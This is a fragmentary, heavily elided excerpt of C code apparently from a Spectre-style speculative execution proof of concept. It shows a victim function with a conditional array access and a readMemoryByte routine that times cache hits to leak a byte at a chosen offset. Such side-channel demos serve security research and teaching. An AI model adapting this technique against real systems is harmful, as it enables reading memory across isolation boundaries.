...
Victim code.
********************************************************************/
volatile int x_is_safe_static = 16;
uint8_t unused1[64];
...
__attribute__((noinline)) void victim_function(size_t x, int *x_is_safe) {
  if (*x_is_safe) temp &= array2[array1[x] * 512];
}
...
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  ...
  for (tries = 999; tries > 0; tries--) {
    ...
    for (i = 0; i < 256; i++) {
      ...
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % (int)16])
